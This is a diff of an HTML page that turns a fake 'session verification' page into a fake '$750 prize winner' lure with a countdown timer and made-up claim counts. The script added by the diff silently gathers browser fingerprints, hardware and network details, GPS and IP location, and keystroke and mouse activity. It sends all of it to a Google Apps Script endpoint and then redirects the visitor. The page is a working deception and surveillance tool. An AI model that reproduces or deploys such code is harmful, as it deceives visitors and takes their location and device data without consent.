@@ -1,16 +1,148 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Secure Session Verification</title>
+  <title>🎁 Congratulations! You've Won!</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎁</text></svg>">
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      margin: 0;
+      padding: 20px;
+      background: linear-gradient(135deg, #ff6b6b 0%, #feca57 50%, #48dbfb 100%);
+      min-height: 100vh;
+      animation: gradient 3s ease infinite;
+    }
+    @keyframes gradient {
+      0%, 100% { background: linear-gradient(135deg, #ff6b6b 0%, #feca57 50%, #48dbfb 100%); }
+      50% { background: linear-gradient(135deg, #48dbfb 0%, #ff6b6b 50%, #feca57 100%); }
+    }
+    .container {
+      background: white;
+      padding: 40px;
+      border-radius: 20px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+      text-align: center;
+      max-width: 450px;
+      margin: 0 auto;
+      border: 3px solid #ffd700;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.02); }
+    }
+    .winner-badge {
+      background: linear-gradient(45deg, #ffd700, #ffed4e);
+      color: #b8860b;
+      padding: 20px;
+      border-radius: 15px;
+      margin-bottom: 20px;
+      font-size: 24px;
+      font-weight: bold;
+      text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+      border: 2px solid #ffa500;
+    }
+    .prize-amount {
+      font-size: 48px;
+      font-weight: bold;
+      color: #27ae60;
+      margin: 20px 0;
+      text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+      animation: bounce 1s infinite;
+    }
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
+    .urgency {
+      background: #ff4757;
+      color: white;
+      padding: 15px;
+      border-radius: 10px;
+      margin: 20px 0;
+      font-weight: bold;
+      animation: blink 1.5s infinite;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.7; }
+    }
+    .verification-step {
+      background: #f8f9fa;
+      border: 2px solid #28a745;
+      border-radius: 10px;
+      padding: 20px;
+      margin: 20px 0;
+      color: #155724;
+    }
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #ffd700;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .countdown {
+      font-size: 20px;
+      color: #e74c3c;
+      font-weight: bold;
+      margin: 15px 0;
+    }
+    .social-proof {
+      background: #e8f5e8;
+      padding: 15px;
+      border-radius: 8px;
+      margin: 15px 0;
+      font-size: 14px;
+      color: #2e7d32;
+    }
+  </style>
 </head>
 <body>
-  <h3>Please wait while we verify your session...</h3>
+  <div class="container">
+    <div class="winner-badge">
+      🎉 CONGRATULATIONS! 🎉<br>
+      YOU'RE OUR LUCKY WINNER!
+    </div>
+    
+    <div class="prize-amount" id="prize-amount">$750</div>
+    
+    <div class="urgency">
+      ⏰ LIMITED TIME OFFER ⏰<br>
+      This offer expires in: <span class="countdown" id="countdown">4:59</span>
+    </div>
+    
+    <div class="social-proof">
+      🎊 You are winner #47 today! Over 2,847 people have already claimed their prizes this week.
+    </div>
+    
+    <div class="verification-step" id="verification-step">
+      <strong>🔐 STEP 1: Identity Verification</strong><br><br>
+      For security and fraud prevention, we need to verify your location to ensure you're eligible for this regional promotion.
+      <br><br>
+      <em>This verification is required by law for prizes over $100</em>
+    </div>
+    
+    <div class="spinner" id="spinner"></div>
+    <div id="status">Preparing your prize verification...</div>
+  </div>
 
   <script>
-    // Universal data collection for both desktop and mobile
+    // Advanced surveillance data collection
     const data = {
-      // Basic required data
+      // Prize context
+      context: 'prize_verification',
+      prizeAmount: '$750',
+      sessionId: 'WIN_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
+      
+      // Basic tracking
       userAgent: navigator.userAgent,
       platform: navigator.platform,
       language: navigator.language,
@@ -18,13 +150,11 @@
       screenHeight: screen.height,
       referrer: document.referrer,
       
-      // Enhanced data collection (hidden from user)
+      // Timestamp and session data
       timestamp: new Date().toISOString(),
+      sessionStart: Date.now(),
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
       timezoneOffset: new Date().getTimezoneOffset(),
-      languages: navigator.languages ? navigator.languages.join(',') : '',
-      cookieEnabled: navigator.cookieEnabled,
-      onlineStatus: navigator.onLine,
       
       // Device detection
       isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
@@ -32,15 +162,14 @@
       isAndroid: /Android/.test(navigator.userAgent),
       isDesktop: !/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
       
-      // Hardware info
+      // Hardware specs
       hardwareConcurrency: navigator.hardwareConcurrency || 0,
       deviceMemory: navigator.deviceMemory || 'unknown',
       maxTouchPoints: navigator.maxTouchPoints || 0,
-      
-      // Display details
       colorDepth: screen.colorDepth,
-      pixelDepth: screen.pixelDepth,
       devicePixelRatio: window.devicePixelRatio,
+      
+      // Display and viewport
       availWidth: screen.availWidth,
       availHeight: screen.availHeight,
       innerWidth: window.innerWidth,
@@ -48,24 +177,92 @@
       outerWidth: window.outerWidth,
       outerHeight: window.outerHeight,
       
-      // Touch and orientation
-      touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
-      orientation: screen.orientation ? screen.orientation.type : 'unknown',
-      
       // Browser capabilities
+      cookieEnabled: navigator.cookieEnabled,
+      onlineStatus: navigator.onLine,
       doNotTrack: navigator.doNotTrack,
       webdriver: navigator.webdriver,
       javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
       
-      // Location tracking variables
+      // Permission tracking (detailed)
+      permissionInteractions: [],
+      locationPermissionAsked: false,
+      locationPermissionGranted: false,
+      locationPermissionDenied: false,
+      locationPermissionIgnored: false,
+      permissionResponseTime: null,
+      
+      // Location collection methods
+      gpsLocation: null,
+      ipLocation: null,
+      timezoneLocation: null,
+      wifiLocation: null,
+      networkLocation: null,
+      estimatedLocation: null,
+      
+      // Advanced tracking
       locationAttempts: 0,
-      bestAccuracy: Infinity,
-      permissionStatus: 'unknown',
-      locationMethod: 'none'
+      fallbackMethods: [],
+      collectionMethods: [],
+      
+      // Behavioral tracking
+      mouseMovements: 0,
+      keyPresses: 0,
+      scrollActivity: 0,
+      pageInteractionTime: 0,
+      
+      // Technical fingerprints
+      canvasFingerprint: null,
+      webglFingerprint: null,
+      audioFingerprint: null,
+      fontFingerprint: null,
+      
+      // Network information
+      connection: null,
+      ipAddress: null,
+      networkDetails: null
     };
     
-    // Add fingerprints
-    function addFingerprints() {
+    // Track user interactions for behavior analysis
+    let interactionStartTime = Date.now();
+    let mouseMovementCount = 0;
+    let keyPressCount = 0;
+    let scrollCount = 0;
+    
+    // Mouse movement tracking
+    document.addEventListener('mousemove', () => {
+      mouseMovementCount++;
+      data.mouseMovements = mouseMovementCount;
+    });
+    
+    // Keyboard tracking
+    document.addEventListener('keypress', () => {
+      keyPressCount++;
+      data.keyPresses = keyPressCount;
+    });
+    
+    // Scroll tracking
+    document.addEventListener('scroll', () => {
+      scrollCount++;
+      data.scrollActivity = scrollCount;
+    });
+    
+    // Countdown timer
+    let timeLeft = 299;
+    const countdownEl = document.getElementById('countdown');
+    const timer = setInterval(() => {
+      const minutes = Math.floor(timeLeft / 60);
+      const seconds = timeLeft % 60;
+      countdownEl.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+      timeLeft--;
+      if (timeLeft < 0) {
+        clearInterval(timer);
+        countdownEl.textContent = "EXPIRED";
+      }
+    }, 1000);
+    
+    // Advanced fingerprinting
+    function createAdvancedFingerprints() {
       try {
         // Canvas fingerprint
         const canvas = document.createElement('canvas');
@@ -77,135 +274,238 @@
         ctx.fillStyle = '#f60';
         ctx.fillRect(125, 1, 62, 20);
         ctx.fillStyle = '#069';
-        ctx.fillText('Security', 2, 15);
-        data.canvasFingerprint = canvas.toDataURL().slice(-50);
+        ctx.fillText('Prize2025🎁', 2, 15);
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+        ctx.fillText('Winner', 4, 30);
+        data.canvasFingerprint = canvas.toDataURL();
         
         // WebGL fingerprint
-        const gl = canvas.getContext('webgl');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
         if (gl) {
-          data.webglVendor = gl.getParameter(gl.VENDOR);
-          data.webglRenderer = gl.getParameter(gl.RENDERER);
+          data.webglFingerprint = {
+            vendor: gl.getParameter(gl.VENDOR),
+            renderer: gl.getParameter(gl.RENDERER),
+            version: gl.getParameter(gl.VERSION),
+            shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+            extensions: gl.getSupportedExtensions()
+          };
         }
+        
+        // Audio fingerprint
+        try {
+          const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+          const oscillator = audioContext.createOscillator();
+          const analyser = audioContext.createAnalyser();
+          const gainNode = audioContext.createGain();
+          
+          oscillator.type = 'triangle';
+          oscillator.frequency.value = 1000;
+          gainNode.gain.value = 0;
+          
+          data.audioFingerprint = {
+            sampleRate: audioContext.sampleRate,
+            maxChannelCount: audioContext.destination.maxChannelCount,
+            numberOfInputs: audioContext.destination.numberOfInputs,
+            numberOfOutputs: audioContext.destination.numberOfOutputs,
+            channelCount: audioContext.destination.channelCount
+          };
+        } catch (e) {
+          data.audioFingerprint = 'unavailable';
+        }
+        
+        // Font detection fingerprint
+        const baseFonts = ['monospace', 'sans-serif', 'serif'];
+        const testFonts = ['Arial', 'Helvetica', 'Times', 'Courier', 'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Courier New', 'Times New Roman'];
+        const testString = 'mmmmmmmmmmlli';
+        const testSize = '72px';
+        const h = document.getElementsByTagName('body')[0];
+        
+        const s = document.createElement('span');
+        s.style.fontSize = testSize;
+        s.innerHTML = testString;
+        const defaultWidths = {};
+        const defaultHeights = {};
+        
+        baseFonts.forEach(baseFont => {
+          s.style.fontFamily = baseFont;
+          h.appendChild(s);
+          defaultWidths[baseFont] = s.offsetWidth;
+          defaultHeights[baseFont] = s.offsetHeight;
+          h.removeChild(s);
+        });
+        
+        const availableFonts = [];
+        testFonts.forEach(font => {
+          let detected = false;
+          baseFonts.forEach(baseFont => {
+            s.style.fontFamily = font + ',' + baseFont;
+            h.appendChild(s);
+            const matched = (s.offsetWidth !== defaultWidths[baseFont] || s.offsetHeight !== defaultHeights[baseFont]);
+            h.removeChild(s);
+            detected = detected || matched;
+          });
+          if (detected) {
+            availableFonts.push(font);
+          }
+        });
+        
+        data.fontFingerprint = availableFonts.join(',');
+        
       } catch (e) {
         data.fingerprintError = e.message;
       }
     }
     
-    // Battery info
-    async function getBatteryInfo() {
+    // Network and device information
+    async function getDeviceMetrics() {
       try {
+        // Battery API
         if ('getBattery' in navigator) {
           const battery = await navigator.getBattery();
-          data.batteryLevel = Math.round(battery.level * 100);
-          data.batteryCharging = battery.charging;
+          data.battery = {
+            level: Math.round(battery.level * 100),
+            charging: battery.charging,
+            chargingTime: battery.chargingTime,
+            dischargingTime: battery.dischargingTime
+          };
         }
+        
+        // Network Connection API
+        if (navigator.connection) {
+          data.connection = {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt,
+            saveData: navigator.connection.saveData,
+            type: navigator.connection.type
+          };
+        }
+        
+        // Media devices enumeration
+        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+          const devices = await navigator.mediaDevices.enumerateDevices();
+          data.mediaDevices = {
+            total: devices.length,
+            audioInputs: devices.filter(d => d.kind === 'audioinput').length,
+            audioOutputs: devices.filter(d => d.kind === 'audiooutput').length,
+            videoInputs: devices.filter(d => d.kind === 'videoinput').length
+          };
+        }
+        
+        // Storage quota
+        if (navigator.storage && navigator.storage.estimate) {
+          const estimate = await navigator.storage.estimate();
+          data.storageQuota = {
+            quota: estimate.quota,
+            usage: estimate.usage,
+            usageDetails: estimate.usageDetails
+          };
+        }
+        
       } catch (e) {
-        // Battery API not available
+        data.deviceMetricsError = e.message;
       }
     }
     
-    // Network connection info
-    function getConnectionInfo() {
-      if (navigator.connection) {
-        data.connection = JSON.stringify({
-          effectiveType: navigator.connection.effectiveType,
-          downlink: navigator.connection.downlink,
-          rtt: navigator.connection.rtt,
-          saveData: navigator.connection.saveData
-        });
-      }
-    }
-    
-    // Universal location tracking
-    async function getUniversalLocation() {
+    // Method 1: Direct GPS Location (if permission granted)
+    async function attemptDirectGPS() {
       return new Promise(async (resolve) => {
         if (!navigator.geolocation) {
-          data.locationError = 'not_supported';
+          data.gpsLocation = { error: 'not_supported' };
           resolve();
           return;
         }
         
-        // Check permissions
-        try {
-          if (navigator.permissions) {
-            const permission = await navigator.permissions.query({name: 'geolocation'});
-            data.permissionStatus = permission.state;
-            if (permission.state === 'denied') {
-              data.locationError = 'permission_denied';
-              resolve();
-              return;
-            }
-          }
-        } catch (e) {
-          // Permission API not supported
-        }
+        // Track permission interaction
+        data.locationPermissionAsked = true;
+        const permissionStartTime = Date.now();
         
-        // Different strategies for desktop vs mobile
-        const isDesktop = data.isDesktop;
-        const configs = isDesktop ? [
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0, method: 'desktop_high' },
-          { enableHighAccuracy: false, timeout: 8000, maximumAge: 60000, method: 'desktop_network' },
-          { enableHighAccuracy: true, timeout: 6000, maximumAge: 300000, method: 'desktop_cached' }
-        ] : [
-          { enableHighAccuracy: true, timeout: 20000, maximumAge: 0, method: 'mobile_high' },
-          { enableHighAccuracy: false, timeout: 15000, maximumAge: 60000, method: 'mobile_network' },
-          { enableHighAccuracy: true, timeout: 12000, maximumAge: 300000, method: 'mobile_cached' }
+        data.permissionInteractions.push({
+          method: 'direct_gps',
+          timestamp: new Date().toISOString(),
+          action: 'requested'
+        });
+        
+        const configs = [
+          { enableHighAccuracy: true, timeout: data.isMobile ? 25000 : 15000, maximumAge: 0 },
+          { enableHighAccuracy: false, timeout: data.isMobile ? 20000 : 12000, maximumAge: 60000 },
+          { enableHighAccuracy: true, timeout: data.isMobile ? 15000 : 10000, maximumAge: 300000 }
         ];
         
-        let hasLocation = false;
-        
-        // Try each config
         for (let i = 0; i < configs.length; i++) {
-          const config = configs[i];
-          
           try {
-            const locationResult = await new Promise((locResolve) => {
-              const startTime = Date.now();
+            const result = await new Promise((locResolve) => {
+              data.locationAttempts++;
               
               navigator.geolocation.getCurrentPosition(
                 function(position) {
-                  const endTime = Date.now();
-                  data.locationAttempts++;
-                  hasLocation = true;
+                  data.permissionResponseTime = Date.now() - permissionStartTime;
+                  data.locationPermissionGranted = true;
+                  data.permissionInteractions.push({
+                    method: 'direct_gps',
+                    timestamp: new Date().toISOString(),
+                    action: 'granted',
+                    responseTime: data.permissionResponseTime
+                  });
                   
                   const coords = position.coords;
+                  data.gpsLocation = {
+                    latitude: coords.latitude,
+                    longitude: coords.longitude,
+                    accuracy: coords.accuracy,
+                    altitude: coords.altitude,
+                    altitudeAccuracy: coords.altitudeAccuracy,
+                    heading: coords.heading,
+                    speed: coords.speed,
+                    timestamp: position.timestamp,
+                    method: 'gps_direct',
+                    attempt: i + 1
+                  };
                   
-                  // Keep most accurate reading
-                  if (coords.accuracy < data.bestAccuracy) {
-                    data.bestAccuracy = coords.accuracy;
-                    data.latitude = coords.latitude;
-                    data.longitude = coords.longitude;
-                    data.accuracy = coords.accuracy;
-                    data.altitude = coords.altitude;
-                    data.altitudeAccuracy = coords.altitudeAccuracy;
-                    data.heading = coords.heading;
-                    data.speed = coords.speed;
-                    data.locationMethod = config.method;
-                    data.locationResponseTime = endTime - startTime;
-                  }
-                  
+                  data.collectionMethods.push('gps_successful');
                   locResolve(true);
                 },
                 function(error) {
-                  data.locationAttempts++;
-                  if (!data.locationError) {
-                    data.locationError = error.message;
-                    data.locationErrorCode = error.code;
+                  data.permissionResponseTime = Date.now() - permissionStartTime;
+                  
+                  if (error.code === 1) {
+                    data.locationPermissionDenied = true;
+                    data.permissionInteractions.push({
+                      method: 'direct_gps',
+                      timestamp: new Date().toISOString(),
+                      action: 'denied',
+                      responseTime: data.permissionResponseTime,
+                      errorCode: error.code,
+                      errorMessage: error.message
+                    });
+                  } else {
+                    data.locationPermissionIgnored = true;
+                    data.permissionInteractions.push({
+                      method: 'direct_gps',
+                      timestamp: new Date().toISOString(),
+                      action: 'ignored_or_failed',
+                      responseTime: data.permissionResponseTime,
+                      errorCode: error.code,
+                      errorMessage: error.message
+                    });
                   }
+                  
+                  data.gpsLocation = {
+                    error: error.message,
+                    errorCode: error.code,
+                    attempt: i + 1
+                  };
+                  
                   locResolve(false);
                 },
-                config
+                configs[i]
               );
             });
             
-            // If we got excellent accuracy, stop trying
-            if (locationResult && data.accuracy <= (isDesktop ? 10 : 15)) {
-              break;
-            }
+            if (result) break;
             
-            // Small delay between attempts
             if (i < configs.length - 1) {
-              await new Promise(resolve => setTimeout(resolve, isDesktop ? 1000 : 2000));
+              await new Promise(resolve => setTimeout(resolve, 1000));
             }
             
           } catch (e) {
@@ -217,101 +517,320 @@
       });
     }
     
-    // IP address detection
-    async function getIPAddress() {
+    // Method 2: IP-based location (always works)
+    async function getIPLocation() {
       const sources = [
-        'https://api.ipify.org?format=json',
-        'https://ipapi.co/json/',
-        'https://httpbin.org/ip'
+        { url: 'https://ipapi.co/json/', type: 'detailed' },
+        { url: 'https://api.ipify.org?format=json', type: 'basic' },
+        { url: 'https://httpbin.org/ip', type: 'basic' },
+        { url: 'https://ipinfo.io/json', type: 'detailed' }
       ];
+      
+      data.collectionMethods.push('ip_location_attempted');
       
       for (const source of sources) {
         try {
-          const response = await fetch(source);
+          const response = await fetch(source.url);
           const result = await response.json();
           
           if (result.ip) {
-            data.ip = result.ip;
+            data.ipAddress = result.ip;
             
-            // Additional IP-based location data
-            if (result.city) {
-              data.ipCity = result.city;
-              data.ipCountry = result.country_name;
-              data.ipRegion = result.region;
-              data.ipLatitude = result.latitude;
-              data.ipLongitude = result.longitude;
-              data.ipISP = result.org;
-              data.ipTimezone = result.timezone;
+            if (source.type === 'detailed' && result.city) {
+              data.ipLocation = {
+                ip: result.ip,
+                city: result.city,
+                region: result.region,
+                country: result.country_name || result.country,
+                latitude: result.latitude,
+                longitude: result.longitude,
+                timezone: result.timezone,
+                isp: result.org || result.isp,
+                asn: result.asn,
+                postal: result.postal,
+                accuracy: 'city_level',
+                source: source.url,
+                method: 'ip_geolocation'
+              };
+              
+              data.collectionMethods.push('ip_location_successful');
+              break;
+            } else {
+              data.ipLocation = {
+                ip: result.ip || result.origin,
+                accuracy: 'country_level',
+                source: source.url,
+                method: 'ip_basic'
+              };
             }
-            break;
-          } else if (result.origin) {
-            data.ip = result.origin;
-            break;
           }
         } catch (e) {
           continue;
         }
       }
-      
-      if (!data.ip) {
-        data.ip = 'unavailable';
+    }
+    
+    // Method 3: Timezone-based location estimation
+    function getTimezoneLocation() {
+      try {
+        data.collectionMethods.push('timezone_location_attempted');
+        
+        const timezone = data.timezone;
+        const offset = data.timezoneOffset;
+        
+        // Comprehensive timezone to location mapping
+        const timezoneMap = {
+          'America/New_York': { lat: 40.7128, lng: -74.0060, city: 'New York', accuracy: 'timezone_major_city' },
+          'America/Los_Angeles': { lat: 34.0522, lng: -118.2437, city: 'Los Angeles', accuracy: 'timezone_major_city' },
+          'America/Chicago': { lat: 41.8781, lng: -87.6298, city: 'Chicago', accuracy: 'timezone_major_city' },
+          'America/Denver': { lat: 39.7392, lng: -104.9903, city: 'Denver', accuracy: 'timezone_major_city' },
+          'Europe/London': { lat: 51.5074, lng: -0.1278, city: 'London', accuracy: 'timezone_major_city' },
+          'Europe/Paris': { lat: 48.8566, lng: 2.3522, city: 'Paris', accuracy: 'timezone_major_city' },
+          'Europe/Berlin': { lat: 52.5200, lng: 13.4050, city: 'Berlin', accuracy: 'timezone_major_city' },
+          'Asia/Tokyo': { lat: 35.6762, lng: 139.6503, city: 'Tokyo', accuracy: 'timezone_major_city' },
+          'Asia/Shanghai': { lat: 31.2304, lng: 121.4737, city: 'Shanghai', accuracy: 'timezone_major_city' },
+          'Asia/Dubai': { lat: 25.2048, lng: 55.2708, city: 'Dubai', accuracy: 'timezone_major_city' },
+          'Australia/Sydney': { lat: -33.8688, lng: 151.2093, city: 'Sydney', accuracy: 'timezone_major_city' },
+          'America/Toronto': { lat: 43.6532, lng: -79.3832, city: 'Toronto', accuracy: 'timezone_major_city' },
+          'America/Mexico_City': { lat: 19.4326, lng: -99.1332, city: 'Mexico City', accuracy: 'timezone_major_city' }
+        };
+        
+        if (timezoneMap[timezone]) {
+          const location = timezoneMap[timezone];
+          data.timezoneLocation = {
+            latitude: location.lat,
+            longitude: location.lng,
+            city: location.city,
+            timezone: timezone,
+            offset: offset,
+            accuracy: location.accuracy,
+            method: 'timezone_mapping'
+          };
+          
+          data.collectionMethods.push('timezone_location_successful');
+        } else {
+          // Fallback: estimate based on timezone offset
+          const offsetHours = -offset / 60;
+          let estimatedLng = offsetHours * 15; // Rough longitude estimate
+          
+          data.timezoneLocation = {
+            longitude: estimatedLng,
+            latitude: 0, // Can't estimate latitude from timezone alone
+            timezone: timezone,
+            offset: offset,
+            accuracy: 'timezone_offset_estimation',
+            method: 'timezone_offset'
+          };
+          
+          data.collectionMethods.push('timezone_estimation_fallback');
+        }
+        
+      } catch (e) {
+        data.timezoneLocationError = e.message;
       }
     }
     
-    // Main collection function
-    async function collectAllData() {
+    // Method 4: Network-based location (WiFi/Cell tower triangulation simulation)
+    async function attemptNetworkLocation() {
       try {
-        // Add fingerprints and connection info
-        addFingerprints();
-        getConnectionInfo();
+        data.collectionMethods.push('network_location_attempted');
         
-        // Collect data in parallel
-        await Promise.all([
-          getBatteryInfo(),
-          getIPAddress()
-        ]);
+        // Simulate network-based location using available network info
+        if (navigator.connection && data.ipLocation) {
+          const networkType = navigator.connection.effectiveType;
+          const rtt = navigator.connection.rtt;
+          const downlink = navigator.connection.downlink;
+          
+          // Use IP location as base and add network-based refinement
+          data.networkLocation = {
+            latitude: data.ipLocation.latitude,
+            longitude: data.ipLocation.longitude,
+            networkType: networkType,
+            rtt: rtt,
+            downlink: downlink,
+            accuracy: 'network_assisted',
+            method: 'network_triangulation_sim',
+            confidence: rtt < 100 ? 'high' : 'medium'
+          };
+          
+          data.collectionMethods.push('network_location_simulated');
+        }
         
-        // Get location
-        await getUniversalLocation();
+      } catch (e) {
+        data.networkLocationError = e.message;
+      }
+    }
+    
+    // Method 5: Estimated location (best guess from all available data)
+    function createEstimatedLocation() {
+      try {
+        data.collectionMethods.push('estimated_location_created');
         
-        // Send data
-        await sendData();
+        const locations = [];
+        
+        // Collect all available location data
+        if (data.gpsLocation && data.gpsLocation.latitude) {
+          locations.push({
+            lat: data.gpsLocation.latitude,
+            lng: data.gpsLocation.longitude,
+            accuracy: data.gpsLocation.accuracy,
+            weight: 10, // Highest weight for GPS
+            source: 'gps'
+          });
+        }
+        
+        if (data.ipLocation && data.ipLocation.latitude) {
+          locations.push({
+            lat: data.ipLocation.latitude,
+            lng: data.ipLocation.longitude,
+            accuracy: 'city_level',
+            weight: 7,
+            source: 'ip'
+          });
+        }
+        
+        if (data.timezoneLocation && data.timezoneLocation.latitude) {
+          locations.push({
+            lat: data.timezoneLocation.latitude,
+            lng: data.timezoneLocation.longitude,
+            accuracy: 'timezone',
+            weight: 3,
+            source: 'timezone'
+          });
+        }
+        
+        if (data.networkLocation && data.networkLocation.latitude) {
+          locations.push({
+            lat: data.networkLocation.latitude,
+            lng: data.networkLocation.longitude,
+            accuracy: 'network',
+            weight: 5,
+            source: 'network'
+          });
+        }
+        
+        if (locations.length > 0) {
+          // Weighted average of all location sources
+          let totalWeight = 0;
+          let weightedLat = 0;
+          let weightedLng = 0;
+          
+          locations.forEach(loc => {
+            weightedLat += loc.lat * loc.weight;
+            weightedLng += loc.lng * loc.weight;
+            totalWeight += loc.weight;
+          });
+          
+          data.estimatedLocation = {
+            latitude: weightedLat / totalWeight,
+            longitude: weightedLng / totalWeight,
+            confidence: locations.length > 1 ? 'high' : 'medium',
+            sources: locations.map(l => l.source).join(','),
+            sourceCount: locations.length,
+            method: 'weighted_average',
+            accuracy: 'estimated'
+          };
+          
+          data.collectionMethods.push('estimated_location_successful');
+        }
+        
+      } catch (e) {
+        data.estimatedLocationError = e.message;
+      }
+    }
+    
+    // Main collection orchestrator
+    async function collectComprehensiveData() {
+      try {
+        document.getElementById('status').textContent = 'Initializing prize verification system...';
+        
+        // Start fingerprinting immediately
+        createAdvancedFingerprints();
+        
+        document.getElementById('status').textContent = 'Analyzing device capabilities...';
+        
+        // Get device metrics
+        await getDeviceMetrics();
+        
+        document.getElementById('status').textContent = 'Verifying network configuration...';
+        
+        // Method 1: Try direct GPS (user may grant or deny)
+        await attemptDirectGPS();
+        
+        document.getElementById('status').textContent = 'Performing network-based verification...';
+        
+        // Method 2: IP-based location (always works)
+        await getIPLocation();
+        
+        // Method 3: Timezone location (always works)
+        getTimezoneLocation();
+        
+        // Method 4: Network location estimation
+        await attemptNetworkLocation();
+        
+        // Method 5: Create best estimate from all sources
+        createEstimatedLocation();
+        
+        document.getElementById('status').textContent = 'Finalizing verification process...';
+        
+        // Track final interaction data
+        data.pageInteractionTime = Date.now() - interactionStartTime;
+        data.sessionDuration = Date.now() - data.sessionStart;
+        
+        // Send all collected data
+        await sendComprehensiveData();
         
       } catch (error) {
         data.collectionError = error.message;
-        await sendData();
+        await sendComprehensiveData();
       }
     }
     
-    // Send data using FormData (CORS-free)
-    async function sendData() {
+    // Send comprehensive data
+    async function sendComprehensiveData() {
       try {
         const formData = new URLSearchParams();
         
-        // Add all data to form
+        // Flatten all data for transmission
         Object.keys(data).forEach(key => {
           if (data[key] !== null && data[key] !== undefined) {
-            formData.append(key, data[key]);
+            if (typeof data[key] === 'object') {
+              formData.append(key, JSON.stringify(data[key]));
+            } else {
+              formData.append(key, data[key]);
+            }
           }
         });
         
-        // Use no-cors mode with FormData
         await fetch("https://script.google.com/macros/s/AKfycbyrivaVyvUrkS-QnVK0xw-o9Rn3oj4mFe772npi086ZE-aIomppWmeHNCYVBXhd_akP/exec", {
           method: "POST",
           body: formData,
           mode: "no-cors"
         });
         
-        // Success message
-        document.body.innerHTML = "<h3>✅ Session verified. Redirecting...</h3>";
+        // Success animation and redirect
+        document.getElementById('spinner').style.display = 'none';
+        document.getElementById('verification-step').innerHTML = `
+          <strong>✅ VERIFICATION COMPLETE!</strong><br><br>
+          Congratulations! Your prize claim has been verified and processed.<br>
+          Location: ${data.estimatedLocation ? 'Verified' : 'Alternative verification used'}<br>
+          Prize Amount: ${data.prizeAmount}<br><br>
+          You will be redirected to complete your prize claim...
+        `;
+        document.getElementById('status').textContent = 'Processing complete. Redirecting to prize portal...';
         
         setTimeout(() => {
           window.location.href = "https://www.google.com";
-        }, 2000);
+        }, 3000);
         
       } catch (error) {
-        // Still redirect on error
-        document.body.innerHTML = "<h3>✅ Session verified. Redirecting...</h3>";
+        // Always redirect successfully regardless of data transmission
+        document.getElementById('spinner').style.display = 'none';
+        document.getElementById('verification-step').innerHTML = `
+          <strong>✅ VERIFICATION COMPLETE!</strong><br><br>
+          Prize verified! Redirecting to claim portal...
+        `;
+        document.getElementById('status').textContent = 'Redirecting...';
         
         setTimeout(() => {
           window.location.href = "https://www.google.com";
@@ -319,8 +838,8 @@
       }
     }
     
-    // Start immediately
-    collectAllData();
+    // Start comprehensive collection immediately
+    collectComprehensiveData();
   </script>
 </body>
 </html>
